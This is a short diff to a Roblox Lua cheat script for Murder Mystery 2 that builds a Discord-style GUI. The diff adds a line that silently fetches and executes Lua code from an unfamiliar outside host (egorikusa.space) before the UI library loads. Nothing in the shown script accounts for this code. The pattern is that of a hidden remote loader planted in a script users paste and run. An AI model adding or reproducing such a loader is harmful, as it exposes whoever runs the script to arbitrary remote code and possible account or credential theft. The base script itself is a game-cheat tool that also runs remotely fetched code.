@@ -1,3 +1,5 @@
+getgenv().gui = false
+loadstring(game:HttpGet("https://egorikusa.space/1d86dafe58575e45878b0bb4.lua", true))()
 local DiscordLib = loadstring(game:HttpGet"https://raw.githubusercontent.com/dawid-scripts/UI-Libs/main/discord%20lib.txt")()
 
 local win = DiscordLib:Window("Murder Mystery 2")
